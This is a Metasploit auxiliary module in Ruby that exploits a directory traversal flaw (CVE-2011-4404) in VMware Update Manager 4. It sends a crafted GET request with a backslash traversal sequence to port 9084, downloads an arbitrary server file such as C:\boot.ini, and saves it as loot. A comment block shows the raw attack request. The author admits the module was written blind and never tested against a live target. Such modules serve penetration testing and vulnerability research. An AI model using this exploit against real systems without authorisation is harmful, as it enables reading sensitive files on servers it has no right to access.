##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => "VMWare Update Manager 4 Directory Traversal",
			'Description'    => %q{
				This modules exploits a directory traversal vulnerability in VMWare Update Manager on
				port 9084.  Versions affected by this vulnerability: vCenter Update Manager 4.1 prior
				to Update 2, vCenter Update Manager 4 Update 4.

				Since I don't have access to Update Manager at the moment, all this had to be written
				blind.  What if it works? LOL
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Alexey Sintsov',  #Initial discovery, poc
					'sinn3r'           #Metasploit
				],
			'References'     =>
				[
					['CVE', '2011-4404'],
					['URL', 'http://www.exploit-db.com/exploits/18138/'],
					['URL', 'http://www.vmware.com/security/advisories/VMSA-2011-0014.html'],
					['URL', 'http://dsecrg.com/pages/vul/show.php?id=342']
				],
			'DisclosureDate' => "Nov 21 2011"))

		register_options(
			[
				Opt::RPORT(9084),
				OptString.new('URIPATH', [true, 'URI path to the downloads/', '/vci/downloads/']),
				OptString.new('FILE', [false, 'Define the remote file to download', 'C:\\boot.ini'])
			], self.class)
	end

	def run_host(ip)
		fname     = File.basename(datastore['FILE'])
		traversal = ".\\..\\..\\..\\..\\..\\..\\..\\"

		res = send_request_raw({
			'method' => 'GET',
			'uri'    => datastore['URIPATH'] + traversal + fname
		}, 25)

		# If there's no response, don't bother
		if res.nil? or res.body.empty?
			print_error("No content retrieved from: #{ip}")
			return
		end

		# Again, no box available for testing. So I'm just ASSUMING the server returns a 404
		# if the file doesn't exist.
		if res.code == 404
			print_error("File not found")
			return
		else
			print_good("File retrieved from: #{ip}")
			# Should I save res, or res.body?  Hmmmm....
			p = store_loot("vmware.traversal.file", "application/octet-stream", rhost, res.body, fname)
			print_status("File stored in: #{p}")
		end
	end
end

=begin
No vulnerable service for testing yet, but here's what the request would look like from this exploit:
sudo nc -l 9084
GET /vci/downloads/.\..\..\..\..\..\..\..\C:\boot.ini HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)

Update Manager is installed as part of the installation process for VirtualCenter
You can install Update Manager on the same computer as VirtualCenter Server or on a different computer.
Update Manager can be installed on computers running the following operating systems:
Windows XP SP2 or later
Windows Server 2003
Update Manager is compatible with other VirtualCenter add‐ons such as VMware Converter Enterprise for
VirtualCenter

Admin guide:
http://www.vmware.com/pdf/vi3_vum_10_admin_guide.pdf
=end